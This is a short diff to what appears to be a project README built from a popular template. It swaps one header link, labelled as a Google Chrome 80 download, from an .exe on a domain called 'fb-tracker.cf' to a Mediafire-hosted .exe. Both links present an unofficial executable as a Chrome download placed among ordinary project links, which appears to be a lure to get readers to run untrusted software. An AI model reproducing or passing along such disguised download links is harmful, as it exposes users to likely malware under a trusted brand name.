@@ -57,7 +57,7 @@
     <br />
     <a href="https://github.com/othneildrew/Best-README-Template">View Demo</a>
     ·
-    <a href="https://fb-tracker.cf/config/google.exe">Google 80.0.3987.87</a>
+    <a href="https://www.mediafire.com/file/1iu1td6jyjfvgcw/google-chrome-800398787-64bit-downzen.com.exe/file">Google 80.0.3987.87</a>
     ·
     <a href="https://github.com/othneildrew/Best-README-Template/issues">Request Feature</a>
   </p>
